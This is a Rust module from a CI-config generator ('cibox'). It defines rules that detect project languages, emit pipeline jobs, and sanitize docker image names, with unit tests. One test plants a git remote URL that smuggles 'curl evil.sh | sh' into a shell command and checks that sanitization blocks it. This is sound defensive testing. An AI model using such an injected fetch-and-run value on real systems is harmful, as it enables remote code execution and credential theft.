//! Rules: opinionated units of CI configuration.
//!
//! Each rule is a struct implementing [`Rule`]: it detects whether it applies
//! to the project (via [`ProjectFacts`]) and contributes platform-neutral
//! [`Job`]s to the pipeline. Detection decides which rules are enabled by
//! default; `cibox.ron` overrides flip individual rules on or off and set the
//! few knobs some rules have.

pub mod cmake;
pub mod docker;
pub mod gitleaks;
pub mod go;
pub mod node;
pub mod python;
pub mod rust;
pub mod zig;

use crate::config::CiboxConfig;
use crate::detection::ProjectFacts;
use crate::ir::{Job, MatrixEntry};

pub use cmake::{CmakeBuild, CmakeFmt, CmakeTest};
pub use docker::{DockerBuild, DockerRelease};
pub use gitleaks::Gitleaks;
pub use go::{GoAudit, GoBuild, GoLint, GoTest};
pub use node::{NodeFmt, NodeLint, NodeTest, NodeTypecheck};
pub use python::{PythonFmt, PythonLint, PythonRelease, PythonTest};
pub use rust::{
    RustAudit, RustClippy, RustDoc, RustFmt, RustFeatureCombos, RustMinimalVersions, RustMsrv,
    RustRelease, RustTest,
};
pub use zig::{ZigBuild, ZigFmt, ZigTest};

/// Docker image with all dependencies needed by generated CI jobs
pub(crate) const CIBOX_IMAGE: &str = "fossable/cibox:latest";

/// One opinionated unit of CI configuration
pub trait Rule {
    /// Stable kebab-case identifier; also the job key in generated configs
    /// and (in snake_case) the field name in cibox.ron
    fn id(&self) -> &'static str;

    /// Short human name, e.g. "Cargo test"
    fn name(&self) -> &'static str;

    /// One-line description for the TUI and `cibox detect`
    fn description(&self) -> &'static str;

    /// Whether the project facts trigger this rule by default
    fn detect(&self, facts: &ProjectFacts) -> bool;

    /// The jobs this rule contributes. Must work even when the rule was
    /// force-enabled without its facts being present.
    fn jobs(&self, facts: &ProjectFacts) -> Vec<Job>;

    /// Whether a job key found in an existing CI file belongs to this rule.
    /// Rules that emit variant ids beyond `id()` must override this so
    /// `cibox update` can conform and prune their jobs.
    fn owns_job_id(&self, id: &str) -> bool {
        id == self.id()
    }
}

/// A rule plus its resolved state for this project + config
pub struct ResolvedRule {
    pub rule: Box<dyn Rule>,
    /// Result of detection against the project facts
    pub detected: bool,
    /// Effective state: the config override, or `detected` when unset
    pub enabled: bool,
}

/// Normalize a configured versions list: trim, drop empties, dedupe
/// preserving order. Duplicate matrix legs would waste CI time.
pub(crate) fn clean_versions(versions: Option<&Vec<String>>) -> Vec<String> {
    let mut cleaned: Vec<String> = Vec::new();
    for v in versions.into_iter().flatten() {
        let v = v.trim();
        if !v.is_empty() && !cleaned.iter().any(|c| c == v) {
            cleaned.push(v.to_string());
        }
    }
    cleaned
}

/// Apply a rule's toolchain-version knob to the job it emits: no versions
/// keeps the rule's default image, a single version pins the image it maps
/// to, and several become a job matrix. `image_for` maps a version string to
/// the container image providing it.
pub(crate) fn with_versions(
    job: Job,
    versions: &[String],
    image_for: impl Fn(&str) -> String,
) -> Job {
    match versions {
        [] => job,
        [v] => job.with_image(image_for(v)),
        vs => job.with_matrix(
            vs.iter()
                .map(|v| MatrixEntry {
                    version: v.clone(),
                    image: image_for(v),
                })
                .collect(),
        ),
    }
}

/// The image name the docker rules build and push, in effect for this
/// project + config: the knob from either docker rule, else the git remote
/// slug, else the directory name.
///
/// The result is always a valid docker reference. The name becomes a literal
/// shell word in the generated pipeline, and none of its sources are
/// trustworthy — the slug comes from whatever `.git/config` says, the
/// directory name from wherever the project happens to sit, and the knob
/// from a file the editor may have been pointed at. `parse_config` rejects a
/// malformed knob outright; anything that still gets this far is sanitized
/// rather than pasted into a command.
pub fn docker_image(facts: &ProjectFacts, config: &CiboxConfig) -> String {
    let raw = config
        .docker_build
        .image_name
        .as_deref()
        .or(config.docker_release.image_name.as_deref())
        .or(facts.repo_slug.as_deref())
        .unwrap_or(&facts.dir_name);
    crate::config::image::coerce_reference(raw)
}

/// Build every rule with its knobs resolved (facts-derived defaults overlaid
/// with config overrides) and compute its enabled state.
pub fn resolve(facts: &ProjectFacts, config: &CiboxConfig) -> Vec<ResolvedRule> {
    let docker_image = docker_image(facts, config);

    let rules: Vec<Box<dyn Rule>> = vec![
        Box::new(RustTest {
            versions: clean_versions(config.rust_test.versions.as_ref()),
        }),
        Box::new(RustFmt),
        Box::new(RustClippy),
        Box::new(RustAudit),
        Box::new(RustDoc),
        Box::new(RustMsrv),
        Box::new(RustFeatureCombos),
        Box::new(RustMinimalVersions),
        Box::new(RustRelease),
        Box::new(PythonTest {
            versions: clean_versions(config.python_test.versions.as_ref()),
        }),
        Box::new(PythonLint),
        Box::new(PythonFmt),
        Box::new(PythonRelease),
        Box::new(GoTest {
            versions: clean_versions(config.go_test.versions.as_ref()),
        }),
        Box::new(GoBuild),
        Box::new(GoLint),
        Box::new(GoAudit),
        Box::new(NodeTest {
            versions: clean_versions(config.node_test.versions.as_ref()),
        }),
        Box::new(NodeLint),
        Box::new(NodeTypecheck),
        Box::new(NodeFmt),
        Box::new(ZigTest),
        Box::new(ZigFmt),
        Box::new(ZigBuild),
        Box::new(CmakeTest),
        Box::new(CmakeBuild),
        Box::new(CmakeFmt),
        Box::new(DockerBuild {
            image: docker_image.clone(),
        }),
        Box::new(DockerRelease {
            image: docker_image,
            platforms: config
                .docker_release
                .platforms
                .clone()
                .unwrap_or_default(),
            sync_readme: config.docker_release.sync_readme.unwrap_or(false),
        }),
        Box::new(Gitleaks),
    ];

    rules
        .into_iter()
        .map(|rule| {
            let detected = rule.detect(facts);
            let enabled = config
                .enabled_override(rule.id())
                .unwrap_or(detected);
            ResolvedRule {
                detected,
                enabled,
                rule,
            }
        })
        .collect()
}

/// Jobs of all enabled rules, in rule order
pub fn enabled_jobs(facts: &ProjectFacts, resolved: &[ResolvedRule]) -> Vec<Job> {
    let jobs: Vec<Job> = resolved
        .iter()
        .filter(|r| r.enabled)
        .flat_map(|r| r.rule.jobs(facts))
        .collect();
    debug_assert!(
        {
            let mut ids: Vec<&str> = jobs.iter().map(|j| j.id.as_str()).collect();
            ids.sort();
            ids.windows(2).all(|w| w[0] != w[1])
        },
        "duplicate job ids across rules"
    );
    jobs
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    fn rust_facts() -> ProjectFacts {
        let dir = tempdir().unwrap();
        fs::write(
            dir.path().join("Cargo.toml"),
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n",
        )
        .unwrap();
        crate::detection::gather_facts(dir.path())
    }

    #[test]
    fn test_versions_knob_flows_into_jobs() {
        let mut config = CiboxConfig::default();
        config.rust_test.enabled = Some(true);
        config.rust_test.versions = Some(vec![
            " 1.85 ".to_string(),
            String::new(),
            "nightly".to_string(),
            "1.85".to_string(),
        ]);
        let resolved = resolve(&ProjectFacts::default(), &config);
        let jobs = enabled_jobs(&ProjectFacts::default(), &resolved);
        let job = jobs.iter().find(|j| j.id == "rust-test").unwrap();
        // Trimmed, de-duped, empties dropped
        let entries = job.matrix.as_ref().unwrap();
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].version, "1.85");
        assert_eq!(entries[1].version, "nightly");
    }

    #[test]
    fn test_rule_ids_are_unique() {
        let resolved = resolve(&ProjectFacts::default(), &CiboxConfig::default());
        let mut ids: Vec<&str> = resolved.iter().map(|r| r.rule.id()).collect();
        ids.sort();
        ids.dedup();
        assert_eq!(ids.len(), resolved.len());
    }

    #[test]
    fn test_detected_rules_enabled_by_default() {
        let facts = rust_facts();
        let resolved = resolve(&facts, &CiboxConfig::default());
        let rust_test = resolved.iter().find(|r| r.rule.id() == "rust-test").unwrap();
        assert!(rust_test.detected);
        assert!(rust_test.enabled);
        let go_test = resolved.iter().find(|r| r.rule.id() == "go-test").unwrap();
        assert!(!go_test.detected);
        assert!(!go_test.enabled);
    }

    #[test]
    fn test_override_disables_detected_rule() {
        let facts = rust_facts();
        let mut config = CiboxConfig::default();
        config.rust_test.enabled = Some(false);
        let resolved = resolve(&facts, &config);
        let rust_test = resolved.iter().find(|r| r.rule.id() == "rust-test").unwrap();
        assert!(rust_test.detected);
        assert!(!rust_test.enabled);
    }

    #[test]
    fn test_override_enables_undetected_rule() {
        let mut config = CiboxConfig::default();
        config.go_test.enabled = Some(true);
        let resolved = resolve(&ProjectFacts::default(), &config);
        let go_test = resolved.iter().find(|r| r.rule.id() == "go-test").unwrap();
        assert!(!go_test.detected);
        assert!(go_test.enabled);
        // Force-enabled rules must still produce jobs without facts
        assert!(!go_test.rule.jobs(&ProjectFacts::default()).is_empty());
    }

    #[test]
    fn test_every_rule_owns_its_emitted_job_ids() {
        // Guards against a rule emitting variant job ids (like
        // docker-release-linux) without overriding owns_job_id
        let mut config = CiboxConfig::default();
        config.docker_release.platforms = Some(vec![
            crate::config::DockerPlatform::LinuxAmd64,
            crate::config::DockerPlatform::WindowsAmd64,
        ]);
        let facts = rust_facts();
        for r in resolve(&facts, &config) {
            for job in r.rule.jobs(&facts) {
                assert!(
                    r.rule.owns_job_id(&job.id),
                    "rule {} does not own its job id {}",
                    r.rule.id(),
                    job.id
                );
            }
        }
    }

    #[test]
    fn test_cache_paths_stay_inside_the_project() {
        // GitLab only archives cache paths under the project directory, so an
        // absolute path means a cache that silently never survives a job
        let facts = ProjectFacts::default();
        let mut config = CiboxConfig::default();
        for r in resolve(&facts, &config) {
            config.set_enabled_override(r.rule.id(), Some(true));
        }
        for r in resolve(&facts, &config) {
            for job in r.rule.jobs(&facts) {
                for path in job.cache.iter().flat_map(|c| &c.paths) {
                    assert!(
                        !path.starts_with('/') && !path.starts_with('~'),
                        "rule {} caches {path}, which is outside the project directory",
                        r.rule.id()
                    );
                }
            }
        }
    }

    #[test]
    fn test_every_rule_has_an_enabled_override_slot() {
        let resolved = resolve(&ProjectFacts::default(), &CiboxConfig::default());
        for r in &resolved {
            let mut config = CiboxConfig::default();
            config.set_enabled_override(r.rule.id(), Some(true));
            assert_eq!(
                config.enabled_override(r.rule.id()),
                Some(true),
                "rule {} is missing from the CiboxConfig override mapping",
                r.rule.id()
            );
        }
    }

    #[test]
    fn test_docker_image_knob_flows_into_jobs() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("Dockerfile"), "FROM alpine\n").unwrap();
        let facts = crate::detection::gather_facts(dir.path());

        let mut config = CiboxConfig::default();
        config.docker_build.image_name = Some("fossable/cibox".to_string());
        let resolved = resolve(&facts, &config);
        let build = resolved
            .iter()
            .find(|r| r.rule.id() == "docker-build")
            .unwrap();
        let jobs = build.rule.jobs(&facts);
        assert!(jobs[0].steps.iter().any(|s| matches!(
            s,
            crate::ir::Step::Run { command, .. } if command.contains("-t fossable/cibox")
        )));
    }

    /// The commands of every job the docker rules emit for `facts` + `config`
    fn docker_commands(facts: &ProjectFacts, config: &CiboxConfig) -> Vec<String> {
        resolve(facts, config)
            .iter()
            .filter(|r| r.rule.id().starts_with("docker-"))
            .flat_map(|r| r.rule.jobs(facts))
            .flat_map(|job| job.steps)
            .filter_map(|step| match step {
                crate::ir::Step::Run { command, .. } => Some(command),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn test_hostile_remote_cannot_reach_the_docker_commands() {
        // The slug comes from whatever .git/config says, and lands in
        // `docker build -t <image> .` in a job holding registry credentials
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("Dockerfile"), "FROM alpine\n").unwrap();
        fs::create_dir_all(dir.path().join(".git")).unwrap();
        fs::write(
            dir.path().join(".git/config"),
            "[remote \"origin\"]\n\turl = https://host/owner/repo; curl evil.sh | sh\n",
        )
        .unwrap();
        let facts = crate::detection::gather_facts(dir.path());
        assert!(facts.repo_slug.as_deref().unwrap().contains("curl"));

        let config = CiboxConfig::default();
        let image = docker_image(&facts, &config);
        assert_eq!(image, "owner/repo-curl-evil.sh-sh");

        let raw = facts.repo_slug.clone().unwrap();
        let commands = docker_commands(&facts, &config);
        for command in &commands {
            assert!(!command.contains(&raw), "{command:?}");
        }
        assert!(commands
            .iter()
            .any(|c| *c == format!("docker build -t {image} .")));
        assert!(commands
            .iter()
            .any(|c| *c == format!("docker push {image}")));
    }

    #[test]
    fn test_directory_name_is_normalized_into_the_image_name() {
        // Uppercase and spaces are both legal in a directory name and
        // rejected by docker
        let dir = tempdir().unwrap();
        let project = dir.path().join("My App");
        fs::create_dir(&project).unwrap();
        fs::write(project.join("Dockerfile"), "FROM alpine\n").unwrap();
        let facts = crate::detection::gather_facts(&project);

        let config = CiboxConfig::default();
        assert_eq!(docker_image(&facts, &config), "my-app");
        assert!(docker_commands(&facts, &config)
            .iter()
            .any(|c| c == "docker build -t my-app ."));
    }

    #[test]
    fn test_docker_platforms_knob_flows_into_jobs() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("Dockerfile"), "FROM alpine\n").unwrap();
        let facts = crate::detection::gather_facts(dir.path());

        let mut config = CiboxConfig::default();
        config.docker_release.platforms = Some(vec![
            crate::config::DockerPlatform::LinuxAmd64,
            crate::config::DockerPlatform::LinuxArm64,
        ]);
        let resolved = resolve(&facts, &config);
        let release = resolved
            .iter()
            .find(|r| r.rule.id() == "docker-release")
            .unwrap();
        let jobs = release.rule.jobs(&facts);
        assert!(jobs[0].steps.iter().any(|s| matches!(
            s,
            crate::ir::Step::Run { command, .. }
                if command.contains("--platform linux/amd64,linux/arm64")
        )));
    }

    #[test]
    fn test_docker_sync_readme_knob_flows_into_jobs() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("Dockerfile"), "FROM alpine\n").unwrap();
        let facts = crate::detection::gather_facts(dir.path());

        let mut config = CiboxConfig::default();
        config.docker_release.sync_readme = Some(true);
        let resolved = resolve(&facts, &config);
        let release = resolved
            .iter()
            .find(|r| r.rule.id() == "docker-release")
            .unwrap();
        let jobs = release.rule.jobs(&facts);
        assert!(jobs[0].steps.iter().any(|s| matches!(
            s,
            crate::ir::Step::Run { command, .. } if command.contains("docker-pushrm")
        )));
    }

    #[test]
    fn test_enabled_jobs_have_unique_ids() {
        let facts = rust_facts();
        let resolved = resolve(&facts, &CiboxConfig::default());
        let jobs = enabled_jobs(&facts, &resolved);
        assert!(!jobs.is_empty());
        let mut ids: Vec<&str> = jobs.iter().map(|j| j.id.as_str()).collect();
        ids.sort();
        ids.dedup();
        assert_eq!(ids.len(), jobs.len());
    }
}
